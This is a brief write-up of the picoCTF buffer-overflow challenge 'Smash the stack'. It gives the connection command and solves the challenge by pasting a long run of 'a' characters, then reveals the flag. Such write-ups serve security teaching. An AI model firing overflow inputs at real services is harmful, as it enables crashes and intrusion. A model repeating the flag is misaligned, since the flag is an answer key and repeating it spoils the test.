Smash the stack

Let's start off simple, can you overflow the correct buffer? The program is available [here](https://artifacts.picoctf.net/c/526/vuln). You 
can view source [here](https://artifacts.picoctf.net/c/526/vuln.c). And connect with it using:

`nc saturn.picoctf.net 57331`

Being the first of the series challenge it's very easy to solve. Just paste in many characters into the program and you'll get the flag:

`Input: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa`

`picoCTF{ov3rfl0ws_ar3nt_that_bad_9d9ee6b9}`
